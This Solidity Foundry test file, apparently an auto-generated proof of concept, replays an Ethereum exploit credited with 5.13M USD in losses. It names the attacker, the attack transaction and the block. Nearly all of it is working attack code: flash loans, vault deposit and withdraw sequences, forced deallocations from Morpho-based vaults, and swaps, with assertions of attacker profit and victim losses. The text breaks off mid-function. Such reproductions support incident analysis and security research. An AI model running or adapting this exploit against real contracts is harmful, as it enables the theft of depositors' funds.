// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import "./Base.sol";

// @KeyInfo - Total Lost : 5.13M USD
// Attacker : 0x7bf716167b48cf527725722c6d79494b45b3bdca
// Attack Contract : 0x0514f827c129c16418a0933e03c99a6af982fc61
// Vulnerable Contract : 0x0514f827c129c16418a0933e03c99a6af982fc61
// Attack Tx : 0x0db528c44f23fc7fa4544684a2fab81096450a14aae8bc89f42cd0592d43da12
// Block : 25471348
// Chain : Ethereum
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : attacker_profit_reproduction
// Reproduced Value : 6.02M USD
//
// @POC Author
// Generated PoC

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_path_entry;
    uint256 constant FORK_BLOCK = 25471347;
    uint256 constant TX_TIMESTAMP = 1783315079;
    uint256 constant TX_BLOCK_NUMBER = 25471348;
    uint256 constant TX_VALUE = 0;

    uint64 constant ATTACKER_EOA_TX_NONCE = 3;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"), FORK_BLOCK);
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttackCa();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        address[] memory entryArg0Addresses = new address[](9);
        entryArg0Addresses[0] = Addresses.LVUSDC;
        entryArg0Addresses[1] = Addresses.LVUSDC_CB06;
        entryArg0Addresses[2] = Addresses.SiloManagedVaultArk;
        entryArg0Addresses[3] = Addresses.A_FD8993_8519;
        entryArg0Addresses[4] = Addresses.vgUSDC;
        entryArg0Addresses[5] = Addresses.tsvSummerfiUSDC;
        entryArg0Addresses[6] = Addresses.Router;
        entryArg0Addresses[7] = Addresses.bUSDC_155;
        entryArg0Addresses[8] = Addresses.xUSD;
        bytes memory entryData = abi.encodeWithSelector(bytes4(0x6624ef70), abi.encode(entryArg0Addresses));
        (bool ok, bytes memory result) = address(attack).call{value: TX_VALUE}(entryData);
        if (!ok) assembly { revert(add(result, 32), mload(result)) }
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
        _assertEcon();
    }

    function _deployAttackCa() internal returns (OurAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _etchAttackRuntime();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _expectedAttackChild(OurAttack attack) internal view returns (address) {
        attack;
        return address(0);
    }

    function _etchAttackRuntime() internal {
        // Exact-address fallback for observed CREATE/CREATE2 and callback surfaces.
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(
            Addresses.attack_path_entry,
            attack,
            Addresses.skyMoneyUsdcRiskCapital,
            "skyMoneyUsdcRiskCapital",
            9829390009809802895
        );
        _expectProfit(Addresses.attack_path_entry, attack, Addresses.Api3CoreUSDC, "Api3CoreUSDC", 4922463164603355015);
        _expectProfit(Addresses.attack_path_entry, attack, Addresses.AVGUSDCcons, "AVGUSDCcons", 9863776235072511154);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.DAI, "DAI", 6016754998120906520734632);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.LVUSDC, "LVUSDC", 20947675455);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.LVUSDC_CB06, "LVUSDC", 77697049639);
        economicOracles.push(
            EconomicOracle(Addresses.BufferArk, Addresses.USDC, "USDC", "victim_loss", false, 999999987, false)
        );
        economicOracles.push(
            EconomicOracle(Addresses.A_37305B_7341, Addresses.USDC, "USDC", "victim_loss", false, 236271521607, false)
        );
        economicOracles.push(
            EconomicOracle(Addresses.spUSDC, Addresses.USDC, "USDC", "victim_loss", false, 1294220796797, false)
        );
        economicOracles.push(
            EconomicOracle(
                Addresses.ERC4626Ark_59E8,
                Addresses.sUSDC,
                "sUSDC",
                "victim_loss",
                false,
                104174968907871957840280,
                false
            )
        );
        economicOracles.push(
            EconomicOracle(
                Addresses.MorphoV2VaultArk_0B25,
                Addresses.Api3CoreUSDC,
                "Api3CoreUSDC",
                "victim_loss",
                false,
                477360514696320788893337,
                false
            )
        );
        economicOracles.push(
            EconomicOracle(
                Addresses.MorphoV2VaultArk_C7B5,
                Addresses.AVGUSDCcons,
                "AVGUSDCcons",
                "victim_loss",
                false,
                33995757006678351110039,
                false
            )
        );
        economicOracles.push(
            EconomicOracle(
                Addresses.A_8948A5_062F, Addresses.spUSDC, "spUSDC", "victim_loss", false, 1294220778910, false
            )
        );
        economicOracles.push(
            EconomicOracle(
                Addresses.SkyUsdsArk,
                Addresses.sUSDS_7FBD,
                "sUSDS",
                "victim_loss",
                false,
                23442669967147307457370,
                false
            )
        );
        economicOracles.push(
            EconomicOracle(
                Addresses.sUSDS_7FBD, Addresses.USDS_384F, "USDS", "victim_loss", false, 140568841520466623314503, false
            )
        );
        economicOracles.push(
            EconomicOracle(
                Addresses.MorphoVaultArk_CD34,
                Addresses.gtUSDC,
                "gtUSDC",
                "victim_loss",
                false,
                253247075004651044131691,
                false
            )
        );
        economicOracles.push(
            EconomicOracle(
                Addresses.sUSDC, Addresses.sUSDS_7FBD, "sUSDS", "victim_loss", false, 104174968907871957840280, false
            )
        );
        economicOracles.push(
            EconomicOracle(
                Addresses.MorphoV2VaultArk_400B,
                Addresses.skyMoneyUsdcRiskCapital,
                "skyMoneyUsdcRiskCapital",
                "victim_loss",
                false,
                278528967524608780113170,
                false
            )
        );
        economicOracles.push(
            EconomicOracle(
                Addresses.MorphoV2VaultArk_958F,
                Addresses.KPK_USDC_Prime,
                "KPK_USDC_Prime",
                "victim_loss",
                false,
                2956344844308776830487355,
                false
            )
        );
        economicOracles.push(
            EconomicOracle(Addresses.A_EB60A8_0D9D, Addresses.USDC, "USDC", "victim_loss", false, 999999990, false)
        );
    }
}

contract OurAttack {
    // - omitted 94 additional pseudocode-backed attacker surface(s)

    function attack() public payable {
        _borrowFlashFunds();
    }

    function _call() internal {
        IERC20Like(Addresses.USDT).approve(Addresses.Permit2, 20000000000);
        IPermit2(Addresses.Permit2)
            .approve(Addresses.USDT, Addresses.UniversalRouter, uint160(20000000000), uint48(1783315080));
        IERC20Like(Addresses.xUSD).balanceOf(address(this));
        bytes[] memory abiArg1 = new bytes[](1);
        abiArg1[0] = executeArg10Payload();
        IUniversalRouter(Addresses.UniversalRouter).execute(hex"10", abiArg1, 1783315079);

        IERC20Like(Addresses.xUSD).balanceOf(address(this));
        IERC20Like(Addresses.xUSD).approve(Addresses.Router, type(uint256).max);
        IERC20Like(Addresses.xUSD).approve(Addresses.Permit2, type(uint256).max);
        IPermit2(Addresses.Permit2)
            .approve(
                Addresses.xUSD,
                Addresses.Router,
                uint160(uint160(0x00ffffffffffffffffffffffffffffffffffffffff)),
                uint48(3566630158)
            );
        IRouter(Addresses.Router)
            .swapSingleTokenExactIn(
                Addresses.StablePool, Addresses.xUSD, Addresses.vgUSDC, 68421198930, 0, 3566630158, false, hex""
            );
    }

    function _flashLoan() internal {
        _handleCallback63();
        _readPoolState6();
    }

    function _handleCallback63() internal {
        _call5();
        _call2();
        _call6();
        _call3();
        _call4();
        ILVUSDC_CB06(Addresses.LVUSDC_CB06).withdrawableTotalAssets();
        ILVUSDC_CB06(Addresses.LVUSDC_CB06).getConfig();
        IERC20Like(Addresses.USDC).balanceOf(Addresses.A_EB60A8_0D9D);
        IERC20Like(Addresses.USDC).approve(Addresses.LVUSDC_CB06, type(uint256).max);
        ILVUSDC_CB06(Addresses.LVUSDC_CB06).deposit(398172237752, address(this));
        ILVUSDC_CB06(Addresses.LVUSDC_CB06).withdrawFromArks(398172236752, address(this), address(this));
        ILVUSDC_CB06(Addresses.LVUSDC_CB06).totalAssets();
        ILVUSDC_CB06(Addresses.LVUSDC_CB06).getConfig();
        IERC20Like(Addresses.USDC).approve(Addresses.tsvSummerfiUSDC, 490636886986);
        ItsvSummerfiUSDC(Addresses.tsvSummerfiUSDC).deposit(490636886986, address(this));
        ILVUSDC(Addresses.LVUSDC).getConfig();
        ILVUSDC(Addresses.LVUSDC).withdrawableTotalAssets();
        ILVUSDC(Addresses.LVUSDC).totalAssets();
        IERC20Like(Addresses.vgUSDC).balanceOf(address(this));
        IvgUSDC(Addresses.vgUSDC).previewRedeem(19075252173684501);
        IvgUSDC(Addresses.vgUSDC).convertToShares(145171647460);
        _call();
        IERC20Like(Addresses.vgUSDC).balanceOf(address(this));
        IvgUSDC(Addresses.vgUSDC).previewRedeem(19551517226711127);
        ILVUSDC(Addresses.LVUSDC).getConfig();
        ILVUSDC(Addresses.LVUSDC).totalAssets();
        IERC20Like(Addresses.USDC).approve(Addresses.LVUSDC, 64828534992005);
        ILVUSDC(Addresses.LVUSDC).deposit(64828534992005, address(this));
        IERC20Like(Addresses.vgUSDC).balanceOf(address(this));
        uint256 transferActionGraphAmount = 19551517226711127;
        IERC20Like(Addresses.vgUSDC).transfer(Addresses.SiloManagedVaultArk, transferActionGraphAmount);
        ILVUSDC(Addresses.LVUSDC).withdrawableTotalAssets();
        ILVUSDC(Addresses.LVUSDC).convertToShares(70959584459782);
        IERC20Like(Addresses.LVUSDC).balanceOf(address(this));
        uint256 redeemShares = 60766209130494;
        ILVUSDC(Addresses.LVUSDC).redeem(redeemShares, address(this), address(this));
    }

    function _readPoolState6() internal {
        ILVUSDC_CB06(Addresses.LVUSDC_CB06).getConfig();
        ILVUSDC_CB06(Addresses.LVUSDC_CB06).totalAssets();
        IERC20Like(Addresses.USDC).approve(Addresses.LVUSDC_CB06, 29517258144045);
        ILVUSDC_CB06(Addresses.LVUSDC_CB06).deposit(29517258144045, address(this));
        IERC20Like(Addresses.tsvSummerfiUSDC).balanceOf(address(this));
        uint256 transferActionGraphAmount_2 = 439778128542;
        IERC20Like(Addresses.tsvSummerfiUSDC).transfer(Addresses.A_FD8993_8519, transferActionGraphAmount_2);
        IERC20Like(Addresses.LVUSDC_CB06).balanceOf(address(this));
        ILVUSDC_CB06(Addresses.LVUSDC_CB06).convertToAssets(27891852788554);
        ILVUSDC_CB06(Addresses.LVUSDC_CB06).getConfig();
        IERC20Like(Addresses.USDC).balanceOf(Addresses.A_EB60A8_0D9D);
        ILVUSDC_CB06(Addresses.LVUSDC_CB06).withdrawFromBuffer(29916430381787, address(this), address(this));
        ILVUSDC_CB06(Addresses.LVUSDC_CB06).getActiveArks();
        IERC4626Ark_80EB(Addresses.ERC4626Ark_80EB).withdrawableTotalAssets();
        IERC4626Ark_59E8(Addresses.ERC4626Ark_59E8).withdrawableTotalAssets();
        IERC4626Ark_8721(Addresses.ERC4626Ark_8721).withdrawableTotalAssets();
        IERC4626Ark_2AD5(Addresses.ERC4626Ark_2AD5).withdrawableTotalAssets();
        IERC4626Ark_9A28(Addresses.ERC4626Ark_9A28).withdrawableTotalAssets();
        IERC4626Ark_0F29(Addresses.ERC4626Ark_0F29).withdrawableTotalAssets();
        IMorphoVaultArk_14C6(Addresses.MorphoVaultArk_14C6).withdrawableTotalAssets();
        IMorphoVaultArk_FD6D(Addresses.MorphoVaultArk_FD6D).withdrawableTotalAssets();
        IMorphoVaultArk_8AEB(Addresses.MorphoVaultArk_8AEB).withdrawableTotalAssets();
        ISkyRewardsArk(Addresses.SkyRewardsArk).withdrawableTotalAssets();
        ISyrupArk(Addresses.SyrupArk).withdrawableTotalAssets();
        ILVUSDC_CB06(Addresses.LVUSDC_CB06).convertToShares(0);
        uint256 usdcApproveAllowance = 40000000000; // value provenance: arg1=40000000000 is covered by prior Addresses.USDC.balanceOf(address) return=29916430381797 with args (Addresses.A_EB60A8_0D9D)
        IERC20Like(Addresses.USDC).approve(Addresses.A_E59242_1564, usdcApproveAllowance);
        IContract_E59242_1564(Addresses.A_E59242_1564)
            .exactOutput(
                Abi_exactOutput_Param0({
                field0: abi.encodePacked(Addresses.USDT, uint24(100), Addresses.USDC),
                field1: Addresses.attack_path_entry,
                field2: 1783315079,
                field3: 20000000000,
                field4: 40000000000
            })
            );
    }

    function _flashLoan2() internal {
        ILVUSDC(Addresses.LVUSDC).getConfig();
        ILVUSDC(Addresses.LVUSDC).totalAssets();
        IERC20Like(Addresses.USDC).balanceOf(Addresses.Morpho);
        uint256 usdcApproveAllowance = 65419171879990; // value provenance: arg1=65419171879990 is covered by prior Addresses.USDC.balanceOf(address) return=105584308060170 with args (Addresses.Morpho)
        IERC20Like(Addresses.USDC).approve(Addresses.Morpho, usdcApproveAllowance);
        bytes memory flashLoanProof = abi.encode(Addresses.USDC);
        bytes memory helperData =
            abi.encodeWithSignature("flashLoan(address,uint256,bytes)", Addresses.USDC, 65419171879990, flashLoanProof);
        _decodedCall(Addresses.Morpho, helperData);
    }

    function _call2() internal {
        _readPoolState15();
        _readPoolState22();
    }

    function _readPoolState15() internal {
        IMorphoV2VaultArk_0B25(Addresses.MorphoV2VaultArk_0B25).vault();
        IApi3CoreUSDC(Addresses.Api3CoreUSDC).liquidityAdapter();
        IERC20Like(Addresses.Api3CoreUSDC).balanceOf(Addresses.MorphoV2VaultArk_0B25);
        IApi3CoreUSDC(Addresses.Api3CoreUSDC).convertToAssets(477360514696320788893337);
        IApi3CoreUSDC(Addresses.Api3CoreUSDC).forceDeallocatePenalty(Addresses.MorphoMarketV1AdapterV2_E001);
        IERC20Like(Addresses.USDC).approve(Addresses.Api3CoreUSDC, 106975925);
        uint256 api3CoreUSDCDepositAmount = 106975925; // value provenance: arg0=106975925 is covered by prior Addresses.Api3CoreUSDC.balanceOf(address) return=477360514696320788893337 with args (Addresses.MorphoV2VaultArk_0B25)
        IApi3CoreUSDC(Addresses.Api3CoreUSDC).deposit(api3CoreUSDCDepositAmount, address(this));
        IMorphoMarketV1AdapterV2_E001(Addresses.MorphoMarketV1AdapterV2_E001).marketIdsLength();
        IMorphoMarketV1AdapterV2_E001(Addresses.MorphoMarketV1AdapterV2_E001).marketIds(0);
        _decodedCall(
            Addresses.Morpho,
            abi.encodeWithSignature(
                "idToMarketParams(bytes32)",
                bytes32(hex"6d2fba32b8649d92432d036c16aa80779034b7469b63abc259b17678857f31c2")
            )
        );
        _decodedCall(
            Addresses.Morpho,
            abi.encodeWithSignature(
                "accrueInterest((address,address,address,address,uint256))",
                Abi_accrueInterest_Param0({
                    field0: Addresses.USDC,
                    field1: Addresses.WstETH,
                    field2: Addresses.MorphoChainlinkOracleV2,
                    field3: Addresses.AdaptiveCurveIrm,
                    field4: 860000000000000000
                })
            )
        );
        _decodedCall(
            Addresses.Morpho,
            abi.encodeWithSignature(
                "market(bytes32)", bytes32(hex"6d2fba32b8649d92432d036c16aa80779034b7469b63abc259b17678857f31c2")
            )
        );
        IApi3CoreUSDC(Addresses.Api3CoreUSDC).liquidityAdapter();
        _decodedCall(
            Addresses.Morpho,
            abi.encodeWithSignature(
                "position(bytes32,address)",
                bytes32(hex"6d2fba32b8649d92432d036c16aa80779034b7469b63abc259b17678857f31c2"),
                Addresses.MorphoMarketV1AdapterV2_E001
            )
        );
        IApi3CoreUSDC(Addresses.Api3CoreUSDC).liquidityAdapter();
        bytes memory forceDeallocateProofChildFrameId273 = abi.encode(
            Addresses.USDC,
            Addresses.WstETH,
            Addresses.MorphoChainlinkOracleV2,
            Addresses.AdaptiveCurveIrm,
            uint256(860000000000000000)
        );
        IApi3CoreUSDC(Addresses.Api3CoreUSDC)
            .forceDeallocate(
                Addresses.MorphoMarketV1AdapterV2_E001, forceDeallocateProofChildFrameId273, 165917376977, address(this)
            );

        IMorphoMarketV1AdapterV2_E001(Addresses.MorphoMarketV1AdapterV2_E001).marketIdsLength();
        IMorphoMarketV1AdapterV2_E001(Addresses.MorphoMarketV1AdapterV2_E001).marketIds(1);
        _decodedCall(
            Addresses.Morpho,
            abi.encodeWithSignature(
                "idToMarketParams(bytes32)",
                bytes32(hex"ba3ba077d9c838696b76e29a394ae9f0d1517a372e30fd9a0fc19c516fb4c5a7")
            )
        );
        _decodedCall(
            Addresses.Morpho,
            abi.encodeWithSignature(
                "accrueInterest((address,address,address,address,uint256))",
                Abi_accrueInterest_Param0({
                    field0: Addresses.USDC,
                    field1: Addresses.FiatTokenProxy,
                    field2: Addresses.MorphoChainlinkOracleV2_E40D,
                    field3: Addresses.AdaptiveCurveIrm,
                    field4: 860000000000000000
                })
            )
        );
        _decodedCall(
            Addresses.Morpho,
            abi.encodeWithSignature(
                "market(bytes32)", bytes32(hex"ba3ba077d9c838696b76e29a394ae9f0d1517a372e30fd9a0fc19c516fb4c5a7")
            )
        );
        IApi3CoreUSDC(Addresses.Api3CoreUSDC).liquidityAdapter();
        _decodedCall(
            Addresses.Morpho,
            abi.encodeWithSignature(
                "position(bytes32,address)",
                bytes32(hex"ba3ba077d9c838696b76e29a394ae9f0d1517a372e30fd9a0fc19c516fb4c5a7"),
                Addresses.MorphoMarketV1AdapterV2_E001
            )
        );
        IApi3CoreUSDC(Addresses.Api3CoreUSDC).liquidityAdapter();
        bytes memory forceDeallocateProofChildFrameId295 = abi.encode(
            Addresses.USDC,
            Addresses.FiatTokenProxy,
            Addresses.MorphoChainlinkOracleV2_E40D,
            Addresses.AdaptiveCurveIrm,
            uint256(860000000000000000)
        );
        IApi3CoreUSDC(Addresses.Api3CoreUSDC)
            .forceDeallocate(
                Addresses.MorphoMarketV1AdapterV2_E001, forceDeallocateProofChildFrameId295, 339415110474, address(this)
            );

        IMorphoMarketV1AdapterV2_E001(Addresses.MorphoMarketV1AdapterV2_E001).marketIdsLength();
        IMorphoMarketV1AdapterV2_E001(Addresses.MorphoMarketV1AdapterV2_E001).marketIds(2);
        _decodedCall(
            Addresses.Morpho,
            abi.encodeWithSignature(
                "idToMarketParams(bytes32)",
                bytes32(hex"7f1224a8598b97a8455d298bd58b0f720f1b4f19a815198b8cdecc9feedada93")
            )
        );
        _decodedCall(
            Addresses.Morpho,
            abi.encodeWithSignature(
                "accrueInterest((address,address,address,address,uint256))",
                Abi_accrueInterest_Param0({
                    field0: Addresses.USDC,
                    field1: Addresses.A_73E0C0_DB98,
                    field2: Addresses.MorphoChainlinkOracleV2_D554,
                    field3: Addresses.AdaptiveCurveIrm,
                    field4: 860000000000000000
                })
            )
        );
        _decodedCall(
            Addresses.Morpho,
            abi.encodeWithSignature(
                "market(bytes32)", bytes32(hex"7f1224a8598b97a8455d298bd58b0f720f1b4f19a815198b8cdecc9feedada93")
            )
        );
    }

    function _readPoolState22() internal {
        IApi3CoreUSDC(Addresses.Api3CoreUSDC).liquidityAdapter();
        _decodedCall(
            Addresses.Morpho,
            abi.encodeWithSignature(
                "position(bytes32,address)",
                bytes32(hex"7f1224a8598b97a8455d298bd58b0f720f1b4f19a815198b8cdecc9feedada93"),
                Addresses.MorphoMarketV1AdapterV2_E001
            )
        );
        IApi3CoreUSDC(Addresses.Api3CoreUSDC).liquidityAdapter();
        bytes memory forceDeallocateProofChildFrameId317 = abi.encode(
            Addresses.USDC,
            Addresses.A_73E0C0_DB98,
            Addresses.MorphoChainlinkOracleV2_D554,
            Addresses.AdaptiveCurveIrm,
            uint256(860000000000000000)
        );
        (bool ok,) = address(Addresses.Api3CoreUSDC)
            .call(
                abi.encodeWithSignature(
                    "forceDeallocate(address,bytes,uint256,address)",
                    Addresses.MorphoMarketV1AdapterV2_E001,
                    forceDeallocateProofChildFrameId317,
                    99999898849,
                    address(this)
                )
            );
        ok; // artifact marked this typed call as non-success; replay must not become stricter than the trace
        IMorphoMarketV1AdapterV2_E001(Addresses.MorphoMarketV1AdapterV2_E001).marketIdsLength();
        IMorphoMarketV1AdapterV2_E001(Addresses.MorphoMarketV1AdapterV2_E001).marketIds(3);
        _decodedCall(
            Addresses.Morpho,
            abi.encodeWithSignature(
                "idToMarketParams(bytes32)",
                bytes32(hex"b323495f7e4148be5643a4ea4a8221eef163e4bccfdedc2a6f4696baacbc86cc")
            )
        );
        _decodedCall(
            Addresses.Morpho,
            abi.encodeWithSignature(
                "accrueInterest((address,address,address,address,uint256))",
                Abi_accrueInterest_Param0({
                    field0: Addresses.USDC,
                    field1: Addresses.WstETH,
                    field2: Addresses.ChainlinkOracle,
                    field3: Addresses.AdaptiveCurveIrm,
                    field4: 860000000000000000
                })
            )
        );
        _decodedCall(
            Addresses.Morpho,
            abi.encodeWithSignature(
                "market(bytes32)", bytes32(hex"b323495f7e4148be5643a4ea4a8221eef163e4bccfdedc2a6f4696baacbc86cc")
            )
        );
        IApi3CoreUSDC(Addresses.Api3CoreUSDC).liquidityAdapter();
        _decodedCall(
            Addresses.Morpho,
            abi.encodeWithSignature(
                "position(bytes32,address)",
                bytes32(hex"b323495f7e4148be5643a4ea4a8221eef163e4bccfdedc2a6f4696baacbc86cc"),
                Addresses.MorphoMarketV1AdapterV2_E001
            )
        );
        IApi3CoreUSDC(Addresses.Api3CoreUSDC).liquidityAdapter();
        bytes memory forceDeallocateProofChildFrameId328 = abi.encode(
            Addresses.USDC,
            Addresses.WstETH,
            Addresses.ChainlinkOracle,
            Addresses.AdaptiveCurveIrm,
            uint256(860000000000000000)
        );
        IApi3CoreUSDC(Addresses.Api3CoreUSDC)
            .forceDeallocate(
                Addresses.MorphoMarketV1AdapterV2_E001, forceDeallocateProofChildFrameId328, 464426763683, address(this)
            );

        IMorphoMarketV1AdapterV2_E001(Addresses.MorphoMarketV1AdapterV2_E001).marketIdsLength();
    }

    function _call3() internal {
        _readPoolState27();
        _replayProtocolCalls();
    }

    function _readPoolState27() internal {
        IMorphoV2VaultArk_958F(Addresses.MorphoV2VaultArk_958F).vault();
        IKPK_USDC_Prime(Addresses.KPK_USDC_Prime).liquidityAdapter();
        IERC20Like(Addresses.KPK_USDC_Prime).balanceOf(Addresses.MorphoV2VaultArk_958F);
        IKPK_USDC_Prime(Addresses.KPK_USDC_Prime).convertToAssets(2956344844308776830487355);
        IKPK_USDC_Prime(Addresses.KPK_USDC_Prime).forceDeallocatePenalty(Addresses.MorphoMarketV1AdapterV2);
        IMorphoMarketV1AdapterV2(Addresses.MorphoMarketV1AdapterV2).marketIdsLength();
        IMorphoMarketV1AdapterV2(Addresses.MorphoMarketV1AdapterV2).marketIds(0);
        _decodedCall(
            Addresses.Morpho,
            abi.encodeWithSignature(
                "idToMarketParams(bytes32)",
                bytes32(hex"0a15460ad263c2186fe0b5df20a8cf71d55f3cfa06de15edcf6138f6b8edd8bf")
            )
        );
        _decodedCall(
            Addresses.Morpho,
            abi.encodeWithSignature(
                "accrueInterest((address,address,address,address,uint256))",
                Abi_accrueInterest_Param0({
                    field0: Addresses.USDC,
                    field1: Addresses.RocketTokenRETH,
                    field2: Addresses.MorphoChainlinkOracleV2_F815,
                    field3: Addresses.AdaptiveCurveIrm,
                    field4: 860000000000000000
                })
            )
        );
        _decodedCall(
            Addresses.Morpho,
            abi.encodeWithSignature(
                "market(bytes32)", bytes32(hex"0a15460ad263c2186fe0b5df20a8cf71d55f3cfa06de15edcf6138f6b8edd8bf")
            )
        );
        IKPK_USDC_Prime(Addresses.KPK_USDC_Prime).liquidityAdapter();
        _decodedCall(
            Addresses.Morpho,
            abi.encodeWithSignature(
                "position(bytes32,address)",
                bytes32(hex"0a15460ad263c2186fe0b5df20a8cf71d55f3cfa06de15edcf6138f6b8edd8bf"),
                Addresses.MorphoMarketV1AdapterV2
            )
        );
        IKPK_USDC_Prime(Addresses.KPK_USDC_Prime).liquidityAdapter();
        bytes memory forceDeallocateProofChildFrameId424 = abi.encode(
            Addresses.USDC,
            Addresses.RocketTokenRETH,
            Addresses.MorphoChainlinkOracleV2_F815,
            Addresses.AdaptiveCurveIrm,
            uint256(860000000000000000)
        );
        IKPK_USDC_Prime(Addresses.KPK_USDC_Prime)
            .forceDeallocate(
                Addresses.MorphoMarketV1AdapterV2, forceDeallocateProofChildFrameId424, 372425946459, address(this)
            );

        IMorphoMarketV1AdapterV2(Addresses.MorphoMarketV1AdapterV2).marketIdsLength();
        IMorphoMarketV1AdapterV2(Addresses.MorphoMarketV1AdapterV2).marketIds(1);
        _decodedCall(
            Addresses.Morpho,
            abi.encodeWithSignature(
                "idToMarketParams(bytes32)",
                bytes32(hex"b8fef900b383db2dbbf4458c7f46acf5b140f26d603a6d1829963f241b82510e")
            )
        );
        _decodedCall(
            Addresses.Morpho,
            abi.encodeWithSignature(
                "accrueInterest((address,address,address,address,uint256))",
                Abi_accrueInterest_Param0({
                    field0: Addresses.USDC,
                    field1: Addresses.OETHProxy,
                    field2: Addresses.A_E8ADFF_EDB0,
                    field3: Addresses.AdaptiveCurveIrm,
                    field4: 860000000000000000
                })
            )
        );
        _decodedCall(
            Addresses.Morpho,
            abi.encodeWithSignature(
                "market(bytes32)", bytes32(hex"b8fef900b383db2dbbf4458c7f46acf5b140f26d603a6d1829963f241b82510e")
            )
        );
        IKPK_USDC_Prime(Addresses.KPK_USDC_Prime).liquidityAdapter();
        _decodedCall(
            Addresses.Morpho,
            abi.encodeWithSignature(
                "position(bytes32,address)",
                bytes32(hex"b8fef900b383db2dbbf4458c7f46acf5b140f26d603a6d1829963f241b82510e"),
                Addresses.MorphoMarketV1AdapterV2
            )
        );
        IKPK_USDC_Prime(Addresses.KPK_USDC_Prime).liquidityAdapter();
        bytes memory forceDeallocateProofChildFrameId460 = abi.encode(
            Addresses.USDC,
            Addresses.OETHProxy,
            Addresses.A_E8ADFF_EDB0,
            Addresses.AdaptiveCurveIrm,
            uint256(860000000000000000)
        );
        IKPK_USDC_Prime(Addresses.KPK_USDC_Prime)
            .forceDeallocate(
                Addresses.MorphoMarketV1AdapterV2, forceDeallocateProofChildFrameId460, 789709312788, address(this)
            );

        IMorphoMarketV1AdapterV2(Addresses.MorphoMarketV1AdapterV2).marketIdsLength();
        IMorphoMarketV1AdapterV2(Addresses.MorphoMarketV1AdapterV2).marketIds(2);
        _decodedCall(
            Addresses.Morpho,
            abi.encodeWithSignature(
                "idToMarketParams(bytes32)",
                bytes32(hex"64d65c9a2d91c36d56fbc42d69e979335320169b3df63bf92789e2c8883fcc64")
            )
        );
        _decodedCall(
            Addresses.Morpho,
            abi.encodeWithSignature(
                "accrueInterest((address,address,address,address,uint256))",
                Abi_accrueInterest_Param0({
                    field0: Addresses.USDC,
                    field1: Addresses.FiatTokenProxy,
                    field2: Addresses.A_A6D695_182A,
                    field3: Addresses.AdaptiveCurveIrm,
                    field4: 860000000000000000
                })
            )
        );
        _decodedCall(
            Addresses.Morpho,
            abi.encodeWithSignature(
                "market(bytes32)", bytes32(hex"64d65c9a2d91c36d56fbc42d69e979335320169b3df63bf92789e2c8883fcc64")
            )
        );
        IKPK_USDC_Prime(Addresses.KPK_USDC_Prime).liquidityAdapter();
        _decodedCall(
            Addresses.Morpho,
            abi.encodeWithSignature(
                "position(bytes32,address)",
                bytes32(hex"64d65c9a2d91c36d56fbc42d69e979335320169b3df63bf92789e2c8883fcc64"),
                Addresses.MorphoMarketV1AdapterV2
            )
        );
    }

    function _replayProtocolCalls() internal {
        IKPK_USDC_Prime(Addresses.KPK_USDC_Prime).liquidityAdapter();
        bytes memory forceDeallocateProofChildFrameId481 = abi.encode(
            Addresses.USDC,
            Addresses.FiatTokenProxy,
            Addresses.A_A6D695_182A,
            Addresses.AdaptiveCurveIrm,
            uint256(860000000000000000)
        );
        IKPK_USDC_Prime(Addresses.KPK_USDC_Prime)
            .forceDeallocate(
                Addresses.MorphoMarketV1AdapterV2, forceDeallocateProofChildFrameId481, 1868812232296, address(this)
            );

        IMorphoMarketV1AdapterV2(Addresses.MorphoMarketV1AdapterV2).marketIdsLength();
    }

    function _call4() internal {
        IMorphoV2VaultArk_400B(Addresses.MorphoV2VaultArk_400B).vault();
        IskyMoneyUsdcRiskCapital(Addresses.skyMoneyUsdcRiskCapital).liquidityAdapter();
        IERC20Like(Addresses.skyMoneyUsdcRiskCapital).balanceOf(Addresses.MorphoV2VaultArk_400B);
        IskyMoneyUsdcRiskCapital(Addresses.skyMoneyUsdcRiskCapital).convertToAssets(278528967524608780113170);
        IskyMoneyUsdcRiskCapital(Addresses.skyMoneyUsdcRiskCapital)
            .forceDeallocatePenalty(Addresses.MorphoMarketV1AdapterV2_8B41);
        IERC20Like(Addresses.USDC).approve(Addresses.skyMoneyUsdcRiskCapital, 576726804);
        uint256 skyMoneyUsdcRiskCapitalDepositAmount = 576726804; // value provenance: arg0=576726804 is covered by prior Addresses.skyMoneyUsdcRiskCapital.balanceOf(address) return=278528967524608780113170 with args (Addresses.MorphoV2VaultArk_400B)
        IskyMoneyUsdcRiskCapital(Addresses.skyMoneyUsdcRiskCapital)
            .deposit(skyMoneyUsdcRiskCapitalDepositAmount, address(this));
        IMorphoMarketV1AdapterV2_8B41(Addresses.MorphoMarketV1AdapterV2_8B41).marketIdsLength();
        IMorphoMarketV1AdapterV2_8B41(Addresses.MorphoMarketV1AdapterV2_8B41).marketIds(0);
        _decodedCall(
            Addresses.Morpho,
            abi.encodeWithSignature(
                "idToMarketParams(bytes32)",
                bytes32(hex"d570c19c0dc0fbe4ab7faf4a37c4150e1c141c8aada8ca3e1b4b6c1b712af93d")
            )
        );
        _decodedCall(
            Addresses.Morpho,
            abi.encodeWithSignature(
                "accrueInterest((address,address,address,address,uint256))",
                Abi_accrueInterest_Param0({
                    field0: Addresses.USDC,
                    field1: Addresses.ERC1967Proxy,
                    field2: Addresses.MorphoChainlinkOracleV2_9DD0,
